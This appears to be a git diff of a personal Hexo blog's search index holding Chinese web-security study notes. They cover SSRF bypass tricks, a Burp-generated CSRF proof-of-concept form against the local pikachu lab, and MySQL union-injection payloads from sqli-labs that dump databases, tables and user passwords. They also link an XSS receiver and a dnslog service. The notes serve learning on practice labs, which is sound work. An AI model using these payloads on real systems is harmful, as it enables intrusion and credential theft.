@@ -33,7 +33,7 @@
 <h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求<br>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a><br>2.dnslog等工具进行测试，看是否被访问<br>–可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。<br>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址<br>–从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址<br>–通过二级域名暴力猜解工具模糊猜测内网地址<br>4.直接返回的Banner、title、content等信息<br>5.留意bool型SSRF<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
 <h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="1-绕过IP"><a href="#1-绕过IP" class="headerlink" title="1.绕过IP"></a>1.绕过IP</h3><p>1）使用IPV6地址<br>2）对IP转化成十进制，八进制等，如0177.0.0.01（八进制）<br>3）利用特殊域名。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1<br>4）利用句号。如127。0。0。1<br>5）可以[::]。如http:&#x2F;&#x2F;[::]:80&#x2F;<br>6）利用短网址。比如百度短地址<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
 <h3 id="2-绕过url解析限制"><a href="#2-绕过url解析限制" class="headerlink" title="2.绕过url解析限制"></a>2.绕过url解析限制</h3><ul>
-<li>1）使用@符号绕过：如<a href="mailto:&#49;&#50;&#55;&#x2e;&#x30;&#46;&#48;&#x2e;&#49;&#64;&#101;&#x76;&#x69;&#108;&#46;&#99;&#x6f;&#109;">&#49;&#50;&#55;&#x2e;&#x30;&#46;&#48;&#x2e;&#49;&#64;&#101;&#x76;&#x69;&#108;&#46;&#99;&#x6f;&#109;</a></li>
+<li>1）使用@符号绕过：如<a href="mailto:&#x31;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;&#x40;&#101;&#x76;&#x69;&#108;&#46;&#x63;&#x6f;&#109;">&#x31;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;&#x40;&#101;&#x76;&#x69;&#108;&#46;&#x63;&#x6f;&#109;</a></li>
 <li>2）利用302跳转，需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</li>
 </ul>
 <h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="PHP中可能存在ssrf的函数"><a href="#PHP中可能存在ssrf的函数" class="headerlink" title="PHP中可能存在ssrf的函数"></a>PHP中可能存在ssrf的函数</h3><p>1）file_get_contents():把整个文件读入一个字符串中，该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能;支持http(s),file协议，在PHP5.4上测试不支持dict，ghoper协议。<br>2）fsockopen():打开一个网络连接或者一个Unix套接字连接，在PHP5.4上测试只有http协议成功<br>3）curl_exec():用于执行指定的CURL会话，支持的协议比较多，常用于SSRF的协议经过测试都支持，如dict,ghoper,file。有的协议需要一定的条件这点需要注意。<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
@@ -244,6 +244,28 @@ return $outText;#新值
       </tags>
   </entry>
   <entry>
+    <title>Web源码拓展</title>
+    <url>/2023/05/20/Web%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
+    <content><![CDATA[<h1 id="Web源码"><a href="#Web源码" class="headerlink" title="Web源码"></a>Web源码</h1><h2 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1.目录结构"></a>1.目录结构</h2><h2 id="2-脚本类型"><a href="#2-脚本类型" class="headerlink" title="2.脚本类型"></a>2.脚本类型</h2><p>ASP&#x2F;PHP&#x2F;ASPX&#x2F;JSP&#x2F;JAVAWEB&#x2F;python</p>
+<h2 id="3-应用分类"><a href="#3-应用分类" class="headerlink" title="3.应用分类"></a>3.应用分类</h2><p>门户-综合类漏洞</p>
+<p>电商-业务逻辑突出</p>
+<p>论坛-xss逻辑突出</p>
+<p>博客-漏洞较少</p>
+<p>第三方-功能决定</p>
+<h2 id="4-其他补充"><a href="#4-其他补充" class="headerlink" title="4.其他补充"></a>4.其他补充</h2><p>框架或非框架-框架漏洞或代码漏洞</p>
+<p>CMS识别-即是否套用了模板</p>
+<p>开源-找漏洞和审计</p>
+<p>内部-渗透测试</p>
+<p>源码获取-搜索&#x2F;淘宝&#x2F;github</p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+      </categories>
+      <tags>
+        <tag>Web源码拓展</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE学习</title>
     <url>/2023/05/20/CVE%E9%83%A8%E5%88%86/</url>
     <content><![CDATA[]]></content>
@@ -437,28 +459,6 @@ return $outText;#新值
       </tags>
   </entry>
   <entry>
-    <title>Web源码拓展</title>
-    <url>/2023/05/20/Web%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
-    <content><![CDATA[<h1 id="Web源码"><a href="#Web源码" class="headerlink" title="Web源码"></a>Web源码</h1><h2 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1.目录结构"></a>1.目录结构</h2><h2 id="2-脚本类型"><a href="#2-脚本类型" class="headerlink" title="2.脚本类型"></a>2.脚本类型</h2><p>ASP&#x2F;PHP&#x2F;ASPX&#x2F;JSP&#x2F;JAVAWEB&#x2F;python</p>
-<h2 id="3-应用分类"><a href="#3-应用分类" class="headerlink" title="3.应用分类"></a>3.应用分类</h2><p>门户-综合类漏洞</p>
-<p>电商-业务逻辑突出</p>
-<p>论坛-xss逻辑突出</p>
-<p>博客-漏洞较少</p>
-<p>第三方-功能决定</p>
-<h2 id="4-其他补充"><a href="#4-其他补充" class="headerlink" title="4.其他补充"></a>4.其他补充</h2><p>框架或非框架-框架漏洞或代码漏洞</p>
-<p>CMS识别-即是否套用了模板</p>
-<p>开源-找漏洞和审计</p>
-<p>内部-渗透测试</p>
-<p>源码获取-搜索&#x2F;淘宝&#x2F;github</p>
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-      </categories>
-      <tags>
-        <tag>Web源码拓展</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>bp工具</title>
     <url>/2023/05/13/bp%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<p>抓包；爆破；repeat尝试；ssrf表单伪造；编码解码</p>
@@ -535,7 +535,7 @@ return $outText;#新值
 <p>性别:boy</p>
 <p>手机:15988767673</p>
 <p>住址:nba lakes</p>
-<p>邮箱:<a href="mailto:&#107;&#111;&#x62;&#101;&#x40;&#x70;&#x69;&#107;&#x61;&#x63;&#104;&#x75;&#46;&#99;&#111;&#109;">&#107;&#111;&#x62;&#101;&#x40;&#x70;&#x69;&#107;&#x61;&#x63;&#104;&#x75;&#46;&#99;&#111;&#109;</a></p>
+<p>邮箱:<a href="mailto:&#107;&#111;&#98;&#101;&#x40;&#x70;&#105;&#107;&#x61;&#x63;&#x68;&#x75;&#x2e;&#x63;&#111;&#x6d;">&#107;&#111;&#98;&#101;&#x40;&#x70;&#105;&#107;&#x61;&#x63;&#x68;&#x75;&#x2e;&#x63;&#111;&#x6d;</a></p>
 </blockquote>
 <p>通过bp抓包，右键工具菜单，生成csrf poc，复制写好的表单html文件，放到同文件夹下(csrfpost\)，记为test.html。</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:81/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;15988767673&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;nba<span class="symbol">&amp;#32;</span>lakes&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;kobe<span class="symbol">&amp;#64;</span>pikachu<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -632,7 +632,7 @@ return $outText;#新值
       </tags>
   </entry>
   <entry>
-    <title>sqli</title>
+    <title>sqli-labs</title>
     <url>/2023/05/20/sqli-labs/</url>
     <content><![CDATA[<p>做题记录存在自己的有道云上，准备挑选后再刷一遍，慢慢更新。</p>
 <h2 id="less-11（post请求注入）"><a href="#less-11（post请求注入）" class="headerlink" title="less 11（post请求注入）"></a>less 11（post请求注入）</h2><p>随便输入账号名ad或者ad”，页面报错，但是输入ad’</p>
@@ -791,7 +791,7 @@ return $outText;#新值
       </tags>
   </entry>
   <entry>
-    <title>sql注入</title>
+    <title>sql注入之报错注入</title>
     <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
 <p><strong>extravtvalue()</strong></p>
@@ -815,40 +815,6 @@ return $outText;#新值
       </categories>
       <tags>
         <tag>报错注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入</title>
-    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
-<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此我们后面要对字段数进行判断。</p>
-<p>mysql中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。</p>
-<p>1、    判断注入点</p>
-<p>假如存在这么一个参数?id&#x3D;1，可以在参数后面加个单引号或者双引号看是否爆sql语法的错误</p>
-<p>2、    判断<strong>闭合</strong>形式</p>
-<p>主要是判断是否是<strong>整形</strong>闭合，还是字符型闭合，如果是字符型闭合 ，又看是否是<strong>单引</strong>号闭合、双引号闭合，或者是<strong>引号加括号</strong>的闭合形式。</p>
-<p>3、判断查询列数</p>
-<p>1’ order by 1–+</p>
-<p>当order by 3时排序第三个栏位回显正常，而order by 4回显错误，可以判断出当前sql语句向该表查询了三个字段。所以说orderby只是判断了当前sql语句查询的字段数，并不是判断Users表中有几个列，目的是为了符合union的用法，即有相同的字段数。</p>
-<p>4、判断显示位</p>
-<p>对于一个网页，如果它的列数有三列，但可能只有1，2列的数据返回页面前端。所以我们需要查询哪个列会回显，得用unionselect 1,2,3来查看回显位。</p>
-<p>常用语句为-1’ union select 1,2,3–+</p>
-<p>这里一定得是-1 union……，而不是1 union…..因为程序在展示数据的时候通常只会取结果集的第一行数据，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。</p>
-<p>只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p>
-<p>5、获取所有数据库名</p>
-<p>6、获取数据库所有表名</p>
-<p>7、获取字段名 </p>
-<p>8、获取字段中的数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库 //爆库</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表	 //爆表</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列							//爆列</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段					 //爆字段</span><br></pre></td></tr></table></figure>
-
-<p>参考：<a href="https://blog.csdn.net/qq_61237064/article/details/121758528?ops_request_misc=%7B%22request_id%22:%22168049213216800211546816%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168049213216800211546816&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-121758528-null-null.142%5Ev80%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">sql注入中的联合注入_ZredamanJ的博客-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>联合注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1053,6 +1019,40 @@ echo $get
       <tags>
         <tag>sql注入</tag>
         <tag>waf绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入之联合注入</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
+<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此我们后面要对字段数进行判断。</p>
+<p>mysql中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。</p>
+<p>1、    判断注入点</p>
+<p>假如存在这么一个参数?id&#x3D;1，可以在参数后面加个单引号或者双引号看是否爆sql语法的错误</p>
+<p>2、    判断<strong>闭合</strong>形式</p>
+<p>主要是判断是否是<strong>整形</strong>闭合，还是字符型闭合，如果是字符型闭合 ，又看是否是<strong>单引</strong>号闭合、双引号闭合，或者是<strong>引号加括号</strong>的闭合形式。</p>
+<p>3、判断查询列数</p>
+<p>1’ order by 1–+</p>
+<p>当order by 3时排序第三个栏位回显正常，而order by 4回显错误，可以判断出当前sql语句向该表查询了三个字段。所以说orderby只是判断了当前sql语句查询的字段数，并不是判断Users表中有几个列，目的是为了符合union的用法，即有相同的字段数。</p>
+<p>4、判断显示位</p>
+<p>对于一个网页，如果它的列数有三列，但可能只有1，2列的数据返回页面前端。所以我们需要查询哪个列会回显，得用unionselect 1,2,3来查看回显位。</p>
+<p>常用语句为-1’ union select 1,2,3–+</p>
+<p>这里一定得是-1 union……，而不是1 union…..因为程序在展示数据的时候通常只会取结果集的第一行数据，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。</p>
+<p>只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p>
+<p>5、获取所有数据库名</p>
+<p>6、获取数据库所有表名</p>
+<p>7、获取字段名 </p>
+<p>8、获取字段中的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库 //爆库</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表	 //爆表</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列							//爆列</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段					 //爆字段</span><br></pre></td></tr></table></figure>
+
+<p>参考：<a href="https://blog.csdn.net/qq_61237064/article/details/121758528?ops_request_misc=%7B%22request_id%22:%22168049213216800211546816%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168049213216800211546816&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-121758528-null-null.142%5Ev80%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">sql注入中的联合注入_ZredamanJ的博客-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>联合注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1318,6 +1318,39 @@ echo $get
       </tags>
   </entry>
   <entry>
+    <title>在线网址</title>
+    <url>/2023/05/13/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[<h2 id="一、在线工具"><a href="#一、在线工具" class="headerlink" title="一、在线工具"></a>一、在线工具</h2><p><a href="https://c.runoob.com/compile/1/">PHP 在线工具 | 菜鸟工具 (runoob.com)</a></p>
+<p><a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64 编码&#x2F;解码 - 在线工具 (toolhelper.cn)</a></p>
+<p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
+<p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
+<h2 id="二、学习网址"><a href="#二、学习网址" class="headerlink" title="二、学习网址"></a>二、学习网址</h2><p><a href="https://www.freebuf.com/column/195521.html">https://www.freebuf.com/column/195521.html</a></p>
+<p><a href="http://xiaodi8.com/?id=25">http://xiaodi8.com/?id=25</a></p>
+<p><a href="https://xz.aliyun.com/t/6103">https://xz.aliyun.com/t/6103</a></p>
+<p><a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p>
+<p>[Nessus安装与使用_nessus安装使用教程_@Camelus的博客-CSDN博客](<a href="https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&request_id=&biz_id=102&utm_term=windows">https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=windows</a> nessus安装&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-1-126803631.142^v87^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<p><a href="https://bbs.zkaq.cn/">Track 安全社区 — 掌控安全在线教育- Track 知识社区 - 掌控安全在线教育 - Powered by 掌控者 (zkaq.cn)</a></p>
+<p><a href="https://overthewire.org/wargames/natas/natas9.html">OverTheWire: Natas Level 8 → Level 9</a></p>
+<p><a href="https://www.52pojie.cn/forum.php">吾爱破解 - LCG - LSG|安卓破解|病毒分析|www.52pojie.cn</a></p>
+<p><a href="https://blog.csdn.net/weixin_44211968/article/details/124696627?ops_request_misc=%7B%22request_id%22:%22168441788816800211527620%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168441788816800211527620&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124696627-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7&spm=1018.2226.3001.4187">【Web 安全】XSS 攻击详解_xss攻击_想变厉害的大白菜的博客-CSDN博客</a></p>
+<p>pikachu靶场 <a href="http://t.csdn.cn/fhhlu">http://t.csdn.cn/fhhlu</a></p>
+<p>乌云社区</p>
+<p>先知社区</p>
+<h2 id="三、学习平台"><a href="#三、学习平台" class="headerlink" title="三、学习平台"></a>三、学习平台</h2><p>xss接收凭条:<a href="https://xss.pt/xss.php">https://xss.pt/xss.php</a></p>
+<p>dnslog平台:<a href="http://ceye.io/">http://ceye.io/</a></p>
+]]></content>
+      <categories>
+        <category>在线工具</category>
+        <category>学习网址</category>
+      </categories>
+      <tags>
+        <tag>编译</tag>
+        <tag>加密解密</tag>
+        <tag>其它工具</tag>
+        <tag>学习网址</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>封神台靶场</title>
     <url>/2023/05/15/%E5%B0%81%E7%A5%9E%E5%8F%B0/</url>
     <content><![CDATA[<h2 id="一、女神小芳"><a href="#一、女神小芳" class="headerlink" title="一、女神小芳"></a>一、女神小芳</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515211214636.png" alt="image-20230515211214636"></p>
@@ -1561,39 +1594,6 @@ echo $get
         <tag>nmap</tag>
         <tag>cs</tag>
         <tag>Nessus</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>在线网址</title>
-    <url>/2023/05/13/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/</url>
-    <content><![CDATA[<h2 id="一、在线工具"><a href="#一、在线工具" class="headerlink" title="一、在线工具"></a>一、在线工具</h2><p><a href="https://c.runoob.com/compile/1/">PHP 在线工具 | 菜鸟工具 (runoob.com)</a></p>
-<p><a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64 编码&#x2F;解码 - 在线工具 (toolhelper.cn)</a></p>
-<p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
-<p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
-<h2 id="二、学习网址"><a href="#二、学习网址" class="headerlink" title="二、学习网址"></a>二、学习网址</h2><p><a href="https://www.freebuf.com/column/195521.html">https://www.freebuf.com/column/195521.html</a></p>
-<p><a href="http://xiaodi8.com/?id=25">http://xiaodi8.com/?id=25</a></p>
-<p><a href="https://xz.aliyun.com/t/6103">https://xz.aliyun.com/t/6103</a></p>
-<p><a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p>
-<p>[Nessus安装与使用_nessus安装使用教程_@Camelus的博客-CSDN博客](<a href="https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&request_id=&biz_id=102&utm_term=windows">https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=windows</a> nessus安装&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-1-126803631.142^v87^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<p><a href="https://bbs.zkaq.cn/">Track 安全社区 — 掌控安全在线教育- Track 知识社区 - 掌控安全在线教育 - Powered by 掌控者 (zkaq.cn)</a></p>
-<p><a href="https://overthewire.org/wargames/natas/natas9.html">OverTheWire: Natas Level 8 → Level 9</a></p>
-<p><a href="https://www.52pojie.cn/forum.php">吾爱破解 - LCG - LSG|安卓破解|病毒分析|www.52pojie.cn</a></p>
-<p><a href="https://blog.csdn.net/weixin_44211968/article/details/124696627?ops_request_misc=%7B%22request_id%22:%22168441788816800211527620%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168441788816800211527620&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124696627-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7&spm=1018.2226.3001.4187">【Web 安全】XSS 攻击详解_xss攻击_想变厉害的大白菜的博客-CSDN博客</a></p>
-<p>pikachu靶场 <a href="http://t.csdn.cn/fhhlu">http://t.csdn.cn/fhhlu</a></p>
-<p>乌云社区</p>
-<p>先知社区</p>
-<h2 id="三、学习平台"><a href="#三、学习平台" class="headerlink" title="三、学习平台"></a>三、学习平台</h2><p>xss接收凭条:<a href="https://xss.pt/xss.php">https://xss.pt/xss.php</a></p>
-<p>dnslog平台:<a href="http://ceye.io/">http://ceye.io/</a></p>
-]]></content>
-      <categories>
-        <category>在线工具</category>
-        <category>学习网址</category>
-      </categories>
-      <tags>
-        <tag>编译</tag>
-        <tag>加密解密</tag>
-        <tag>其它工具</tag>
-        <tag>学习网址</tag>
       </tags>
   </entry>
   <entry>
